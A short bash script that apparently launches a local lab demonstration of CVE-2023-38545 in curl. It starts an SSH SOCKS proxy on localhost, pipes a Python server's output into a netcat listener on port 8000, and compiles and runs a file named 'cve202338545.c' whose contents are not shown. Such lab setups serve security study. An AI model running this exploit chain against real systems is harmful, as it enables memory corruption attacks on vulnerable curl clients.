#!/bin/bash

# Prompt for sudo password once at the beginning
sudo -v

# Create the initial log file for rsyslog to read
touch /tmp/server_output.log
sudo chmod 644 /tmp/server_output.log

# Open the first terminal and execute the SSH command with the Python script in the SSH connection
xterm -hold -e 'ssh -D 10801 127.0.0.1 <<EOF
sleep 5; \
cd 312551814; \
python3 server.py | tee /tmp/server_output.log | nc -C -nvlp 8000; \
exec bash' &

# Wait for a few seconds before opening the second terminal
sleep 20

# Open the second terminal and execute the C executable
xterm -hold -e 'sleep 10; \
gcc cve202338545.c -lcurl; \
sleep 5; \
./a.out; \
exec bash' &
